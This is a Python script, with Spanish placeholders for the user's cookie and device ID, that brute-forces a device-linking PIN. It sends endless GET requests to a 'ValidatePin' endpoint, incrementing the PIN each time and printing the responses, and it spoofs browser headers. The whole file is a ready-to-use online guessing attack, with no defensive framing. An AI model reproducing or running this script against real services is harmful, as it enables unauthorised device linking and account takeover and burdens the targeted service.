import requests
x = 69619
while True:
        url = f"https://example.com/cdp/link/ValidatePin?deviceID=NUEMERO&deviceTypeID=IDNAME&gascEnabled=true&marketplaceId=234&pin={x}&firmware=1&version=1"

        payload={}
        headers = {
          'Host': 'example.com',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
          'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
          'Accept-Encoding': 'gzip, deflate',
          'Dnt': '1',
          'Upgrade-Insecure-Requests': '1',
          'Sec-Fetch-Dest': 'document',
          'Sec-Fetch-Mode': 'navigate',
          'Sec-Fetch-Site': 'none',
          'Sec-Fetch-User': '?1',
          'Pragma': 'no-cache',
          'Cache-Control': 'no-cache',
          'Te': 'trailers',
          'Connection': 'close',
          'Cookie': 'PON TU Cookie'
        }

        response = requests.request("GET", url, headers=headers, data=payload)

        print(response.text,x)
        x += 1
